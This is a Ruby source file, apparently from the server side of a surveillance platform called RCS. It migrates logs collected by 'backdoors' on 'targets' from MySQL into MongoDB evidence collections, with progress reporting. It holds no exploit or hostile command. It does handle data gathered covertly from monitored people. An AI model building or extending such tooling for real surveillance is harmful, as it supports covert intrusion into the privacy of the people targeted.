require 'rcs-db/db_layer'

module RCS
module DB

class LogMigration
  extend Tracer

  @@total = 0
  @@size = 0

  def self.migrate(verbose, activity, exclude)
  
    puts "Migrating logs for:"

    if activity.upcase == 'ALL' then
      activities = Item.where({_kind: 'operation'})
    else
      activities = Item.where({_kind: 'operation', name: activity})
    end

    activities.each do |act|
      puts "-> #{act.name}"

      # if exclude is not defined, everything is good
      exclude ||= []
      
      unless exclude.include? act[:name]
        migrate_single_activity act[:_id]
        puts "#{@@total} logs (#{@@size.to_s_bytes}) migrated to evidence."
        @@total = 0
        @@size = 0
      else
        puts "   SKIPPED"
      end
    end
  end
  
  def self.migrate_single_activity(id)
    targets = Item.where({_kind: 'target'}).also_in({_path: [id]})

    targets.each do |targ|
      puts "   + #{targ.name}"
      migrate_single_target targ[:_id]
    end
  end

  def self.migrate_single_target(id)

    # delete evidence if already present
    db = Mongoid.database
    db.drop_collection Evidence.collection_name(id.to_s)

    # migrate evidence for each backdoor
    backdoors = Item.where({_kind: 'backdoor'}).also_in({_path: [id]})
    backdoors.each do |bck|

      # clear stats for the backdoor
      bck.stat.evidence = {}
      bck.stat.size = 0
      bck.save

      # delete all files related to the backdoor
      GridFS.instance.delete_by_backdoor(bck[:_id].to_s)

      puts "      * #{bck.name}"

      # get the number of logs we have...
      count = DB.instance.mysql_query("SELECT COUNT(*) as count FROM `log` WHERE backdoor_id = #{bck[:_mid]};").to_a
      count = count[0][:count]

      @@total += count

      # iterate for every log...
      log_ids = DB.instance.mysql_query("SELECT log_id FROM `log` WHERE backdoor_id = #{bck[:_mid]} ORDER BY `log_id`;")
      
      current = 0
      size = 0
      print "         #{current} of #{count} | 0 %\r"

      prev_time = Time.now.to_i
      prev_current = 0
      processed = 0
      percentage = 0
      speed = 0
      
      log_ids.each do |log_id|
        current = current + 1
        log = DB.instance.mysql_query("SELECT * FROM log LEFT JOIN note ON note.log_id = log.log_id LEFT JOIN blotter_log ON log.log_id = blotter_log.log_id WHERE log.log_id = #{log_id[:log_id]};").to_a.first

        this_size = log[:longblob1].size + log[:longtext1].size + log[:varchar1].size + log[:varchar2].size + log[:varchar3].size + log[:varchar4].size
        size += this_size
        @@size += this_size

        # calculate how many logs processed in a second or in a processing time of one log (whichever is lower)
        time = Time.now.to_i
        if time != prev_time then
          processed = (current - prev_current) / (time - prev_time)
          speed = size / (time - prev_time)
          percentage = current.to_f / count * 100 if count != 0
          prev_time = time
          prev_current = current
          size = 0
        end
        
        migrate_single_log(log, id.to_s, bck[:_id])
        
        # report the status
        print "         #{current} of #{count}  %2.1f %% | #{processed}/sec  #{speed.to_s_bytes}/sec | #{@@size.to_s_bytes}      \r" % percentage
        $stdout.flush
      end
      # after completing print the status
      puts "         #{current} of #{count} | 100 %                                                                               "
    end
  end

  def self.migrate_single_log(log, target_id, backdoor_id)

    ev = Evidence.dynamic_new target_id
    ev.acquired = log[:acquired].to_i
    ev.received = log[:received].to_i
    ev.type = log[:type].downcase
    ev.relevance = log[:tag]
    ev.blotter = true unless log[:blotter_id].nil?
    ev.note = log[:content] unless log[:content].nil?
    ev.item = [ backdoor_id ]

    # TODO: parse log specific data
    ev.data = {}
    ev.data[:_grid_size] = log[:longblob1].bytesize
    ev.data[:_grid] = GridFS.instance.put(log[:longblob1], {filename: backdoor_id.to_s}) if log[:longblob1].bytesize > 0
    
    ev.save
  end

end

end # ::DB
end # ::RCS
